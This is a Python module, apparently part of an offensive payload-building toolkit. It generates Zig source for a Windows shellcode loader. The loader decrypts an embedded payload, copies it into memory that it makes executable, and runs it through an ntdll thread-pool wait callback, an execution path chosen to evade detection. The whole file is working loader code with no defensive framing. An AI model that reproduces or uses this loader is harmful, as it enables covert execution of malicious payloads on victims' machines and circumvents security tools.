#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Thread pool wait callback execution — pure Zig."""

from __future__ import annotations

from lib.compile.injection_common import InjectionBuilder
from lib.compile.zig_loader_common import zig_decode_decrypt_preamble, zig_sleep_ms, zig_std_preamble


class ThreadpoolInjectionBuilder(InjectionBuilder):

    def build_zig_source(self, encoded_payload: str, key: bytes, iv=None) -> str:
        decode = zig_decode_decrypt_preamble(encoded_payload, key, iv, cipher=self.cipher)
        return f"""
{zig_std_preamble()}
{decode}

const WaitCallback = *const fn (?*anyopaque, ?*anyopaque, ?*anyopaque, w.ULONG) callconv(.c) void;
const FnTpAllocWait = *const fn (*?*anyopaque, WaitCallback, ?*anyopaque, ?*anyopaque) callconv(.c) i32;
const FnTpSetWait = *const fn (?*anyopaque, ?w.HANDLE, ?*anyopaque) callconv(.c) void;
const FnTpReleaseWait = *const fn (?*anyopaque) callconv(.c) void;

fn runViaThreadpool(sc: []const u8) bool {{
    const hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == null) return false;

    const pAlloc: FnTpAllocWait = @ptrCast(@alignCast(GetProcAddress(hNtdll, "TpAllocWait") orelse return false));
    const pSet: FnTpSetWait = @ptrCast(@alignCast(GetProcAddress(hNtdll, "TpSetWait") orelse return false));
    const pReleaseRaw = GetProcAddress(hNtdll, "TpReleaseWait");
    const pRelease: ?FnTpReleaseWait = if (pReleaseRaw) |p| @ptrCast(@alignCast(p)) else null;

    const exec = VirtualAlloc(null, sc.len, w.MEM_COMMIT | w.MEM_RESERVE, w.PAGE_READWRITE) orelse return false;
    @memcpy(@as([*]u8, @ptrCast(exec))[0..sc.len], sc);
    var old: w.DWORD = 0;
    if (VirtualProtect(exec, sc.len, w.PAGE_EXECUTE_READ, &old) == 0) {{
        _ = VirtualFree(exec, 0, w.MEM_RELEASE);
        return false;
    }}

    const hEvent = CreateEventA(null, 1, 1, null);
    if (hEvent == null) {{
        _ = VirtualFree(exec, 0, w.MEM_RELEASE);
        return false;
    }}

    var waitObj: ?*anyopaque = null;
    if (pAlloc(&waitObj, @ptrCast(@alignCast(exec)), null, null) != 0) {{
        _ = CloseHandle(hEvent.?);
        _ = VirtualFree(exec, 0, w.MEM_RELEASE);
        return false;
    }}
{zig_sleep_ms(self.sleep_ms)}
    pSet(waitObj, hEvent, null);
    Sleep(2000);

    if (pRelease) |rel| rel(waitObj);
    _ = CloseHandle(hEvent.?);
    _ = VirtualFree(exec, 0, w.MEM_RELEASE);
    return true;
}}

pub fn main() u8 {{
    var gpa = std.heap.GeneralPurposeAllocator(.{{}}){{}};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    const sc = decodeAndDecrypt(allocator) catch return 1;
    defer allocator.free(sc);
    if (!runViaThreadpool(sc)) return 1;
    return 0;
}}
"""
